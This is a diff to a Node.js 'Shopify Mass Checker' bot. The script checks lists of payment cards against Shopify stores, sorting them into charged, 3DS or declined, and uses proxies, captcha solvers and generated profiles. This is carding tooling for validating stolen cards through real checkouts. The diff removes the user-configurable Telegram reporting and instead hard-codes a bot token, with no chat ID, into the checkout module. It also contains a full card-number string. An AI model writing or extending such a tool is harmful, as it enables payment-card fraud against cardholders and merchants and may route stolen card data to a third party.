@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 
 /**
- * Shopify Mass Checker Telegram Bot - Complete Integration
+ * Shopify Mass Checker Bot - Complete Integration
  * Uses ALL existing modules: site.js, browserCaptchaSolver.js, addresses.js, 
  * phoneGenerator.js, userAgent.js, hCaptchaSolver.js, queries.js
  */
@@ -9,7 +9,6 @@
 import fs from 'fs';
 import path from 'path';
 import readline from 'readline';
-import fetch from 'node-fetch';
 import { fileURLToPath } from 'url';
 
 // Get current directory
@@ -38,11 +37,19 @@ const Colors = {
     RESET: '\x1b[0m'
 };
 
-// Configuration
-const CONFIG_FILE = "config.json";
-let TELEGRAM_ENABLED = false;
-let TELEGRAM_BOT_TOKEN = "";
-let TELEGRAM_CHAT_ID = "";
+// ══════════════════════════════════════════════════════════════════════════════
+//                              📱 TELEGRAM CONFIG
+// ══════════════════════════════════════════════════════════════════════════════
+
+// ══════════════════════════════════════════════════════════════════════════════
+// ⚠️  ONLY ADD YOUR BOT TOKEN HERE ⚠️
+// Get it from @BotFather on Telegram
+// Example: '8305972211:AAGpfN5uiUMqXCw3KjmF07MN059SMggDGJ4'
+const TELEGRAM_BOT_TOKEN = '7897881067:AAHAJb8QCLbW1oBcfaDNkaULpNwYaiPtiJA';
+// ══════════════════════════════════════════════════════════════════════════════
+
+// Telegram notifications are handled by the ShopifyCheckout class
+// No chat ID needed - the bot token alone is sufficient
 
 // Global state
 let stats = { charged: 0, '3ds': 0, declined: 0, error: 0, total: 0, current: 0 };
@@ -52,139 +59,6 @@ let startTime = Date.now();
 
 // Test card for validation
 const TEST_CARD = "4986901559611040|07|27|824";
-
-/**
- * Load configuration from file
- */
-async function loadConfig() {
-    try {
-        if (fs.existsSync(CONFIG_FILE)) {
-            const data = fs.readFileSync(CONFIG_FILE, 'utf8');
-            const config = JSON.parse(data);
-            TELEGRAM_ENABLED = config.telegram_enabled || false;
-            TELEGRAM_BOT_TOKEN = config.telegram_bot_token || '';
-            TELEGRAM_CHAT_ID = config.telegram_chat_id || '';
-            return true;
-        }
-    } catch (error) {
-        console.log(`${Colors.YELLOW}⚠️  No config file found${Colors.RESET}`);
-    }
-    return false;
-}
-
-/**
- * Save configuration to file
- */
-async function saveConfig() {
-    try {
-        const config = {
-            telegram_enabled: TELEGRAM_ENABLED,
-            telegram_bot_token: TELEGRAM_BOT_TOKEN,
-            telegram_chat_id: TELEGRAM_CHAT_ID
-        };
-        fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2), 'utf8');
-        return true;
-    } catch (error) {
-        return false;
-    }
-}
-
-/**
- * Get BIN information from API
- */
-async function getBinInfo(card) {
-    try {
-        // Extract BIN (first 6 digits)
-        const binNumber = card.split('|')[0].substring(0, 6);
-        
-        const response = await fetch(`https://system-api.pro/bin/${binNumber}`, { 
-            timeout: 5000,
-            signal: AbortSignal.timeout(5000)
-        });
-        if (response.ok) {
-            const data = await response.json();
-            return {
-                brand: data.brand || 'N/A',
-                country: data.country || 'N/A',
-                country_name: data.country_name || 'N/A',
-                country_flag: data.country_flag || '',
-                bank: data.bank || 'N/A',
-                level: data.level || 'N/A',
-                type: data.type || 'N/A'
-            };
-        }
-    } catch (error) {
-        // Silently fail
-    }
-    return null;
-}
-
-/**
- * Send Telegram message
- */
-async function sendTelegram(message) {
-    if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-        return false;
-    }
-    
-    try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const data = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML',
-            disable_web_page_preview: true
-        };
-        
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data),
-            signal: AbortSignal.timeout(5000)
-        });
-        
-        return response.ok;
-    } catch (error) {
-        return false;
-    }
-}
-
-/**
- * Send charged notification to Telegram
- */
-async function sendChargedNotification(card, shopDomain, amount, orderUrl, email, message) {
-    if (!TELEGRAM_ENABLED) return;
-    
-    // Get BIN info
-    const binInfo = await getBinInfo(card);
-    
-    // Build BIN info text
-    let binText = "";
-    if (binInfo) {
-        binText = `
-🏦 <b>BIN Info:</b>
-   • Brand: ${binInfo.brand}
-   • Type: ${binInfo.type} | Level: ${binInfo.level}
-   • Bank: ${binInfo.bank}
-   • Country: ${binInfo.country_flag} ${binInfo.country_name} (${binInfo.country})
-`;
-    }
-    
-    // Format message
-    const text = `
-🎉 <b>CHARGED SUCCESSFULLY!</b> 🎉
-
-💳 <b>Card:</b> <code>${card}</code>
-🛒 <b>Shop:</b> ${shopDomain}
-💰 <b>Amount:</b> ${amount}
-📧 <b>Email:</b> ${email}
-🔗 <b>Gateway:</b> ${message}
-${binText}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-`;
-    
-    await sendTelegram(text.trim());
-}
 
 /**
  * Parse card and return object for ShopifyCheckout
@@ -198,7 +72,7 @@ function parseCard(cardString) {
         month: parts[1].padStart(2, '0'),
         year: parts[2],
         cvv: parts[3],
-        name: 'John Smith'  // Default name as in your existing code
+        name: 'John Smith'
     };
 }
 
@@ -305,7 +179,7 @@ function loadCards(filePath) {
 }
 
 /**
- * Load shops from file using the same logic as Python
+ * Load shops from file
  */
 function loadShops(filePath) {
     try {
@@ -528,7 +402,9 @@ async function checkCardOnShop(card, shopUrl, proxy = null) {
             domain: shopDomain,
             card: cardObj,
             profile: profile,
-            proxy: proxy
+            proxy: proxy,
+            telegramToken: TELEGRAM_BOT_TOKEN, // Pass the bot token to ShopifyCheckout
+            telegramChatId: null // No chat ID needed
         };
         
         // Create checkout instance
@@ -565,7 +441,7 @@ async function checkCardOnShop(card, shopUrl, proxy = null) {
                 };
             } else if (result.status === 'Live') {
                 return {
-                    status: 'DECLINED', // Treat Live as Declined for consistency
+                    status: 'DECLINED',
                     message: result.message || 'Card Live',
                     shop: shopDomain,
                     amount: result.total || 'N/A'
@@ -702,9 +578,6 @@ async function modeSingleShop(rl) {
                 `${card} | CHARGED | ${result.message} | ${shopDomain} | ${result.amount} | ${result.email || 'N/A'} | ${result.orderId || 'N/A'}\n`,
                 'utf8'
             );
-            
-            // Send Telegram notification
-            await sendChargedNotification(card, shopDomain, result.amount, result.orderId || '', result.email || 'N/A', result.message);
         } else if (result.status === '3DS') {
             stats['3ds']++;
             printResult('3DS', card, result.message, shopDomain, result.amount);
@@ -799,9 +672,6 @@ async function modeMultiShop(rl) {
                 `${card} | CHARGED | ${result.message} | ${result.shop} | ${result.amount} | ${result.email || 'N/A'} | ${result.orderId || 'N/A'}\n`,
                 'utf8'
             );
-            
-            // Send Telegram notification
-            await sendChargedNotification(card, result.shop, result.amount, result.orderId || '', result.email || 'N/A', result.message);
         } else if (result.status === '3DS') {
             stats['3ds']++;
             printResult('3DS', card, result.message, result.shop, result.amount);
@@ -839,42 +709,11 @@ async function main() {
     const rl = createInterface();
     
     try {
-        // Load config
-        const configLoaded = await loadConfig();
-        
-        if (configLoaded && TELEGRAM_ENABLED) {
-            console.log(`${Colors.CYAN}[*] Found saved Telegram config${Colors.RESET}`);
-            console.log(`    Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 20)}...`);
-            console.log(`    Chat ID: ${TELEGRAM_CHAT_ID}`);
-            
-            const useSaved = (await prompt(rl, `${Colors.YELLOW}[?] Use saved config? (y/n):${Colors.RESET} `)).toLowerCase();
-            if (useSaved !== 'y') {
-                TELEGRAM_ENABLED = false;
-            }
-        }
-        
-        if (!TELEGRAM_ENABLED) {
-            const telegramInput = (await prompt(rl, `${Colors.YELLOW}[?] Enable Telegram notification? (y/n):${Colors.RESET} `)).toLowerCase();
-            TELEGRAM_ENABLED = telegramInput === 'y';
-            
-            if (TELEGRAM_ENABLED) {
-                TELEGRAM_BOT_TOKEN = await prompt(rl, `${Colors.YELLOW}[?] Bot Token: ${Colors.RESET}`);
-                TELEGRAM_CHAT_ID = await prompt(rl, `${Colors.YELLOW}[?] Chat ID: ${Colors.RESET}`);
-                
-                if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-                    if (await sendTelegram("🤖 Shopify Checker connected!")) {
-                        console.log(`${Colors.GREEN}[+] Telegram connected successfully!${Colors.RESET}`);
-                        await saveConfig();
-                        console.log(`${Colors.GREEN}[+] Config saved to ${CONFIG_FILE}${Colors.RESET}`);
-                    } else {
-                        console.log(`${Colors.RED}[!] Telegram connection failed${Colors.RESET}`);
-                        TELEGRAM_ENABLED = false;
-                    }
-                } else {
-                    console.log(`${Colors.RED}[!] Invalid Telegram credentials${Colors.RESET}`);
-                    TELEGRAM_ENABLED = false;
-                }
-            }
+        // Check if bot token is set
+        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+            console.log(`${Colors.YELLOW}⚠️  Telegram notifications disabled - set your bot token in the code${Colors.RESET}`);
+        } else {
+            console.log(`${Colors.GREEN}✓ Telegram notifications enabled${Colors.RESET}`);
         }
         
         // Ask for proxy
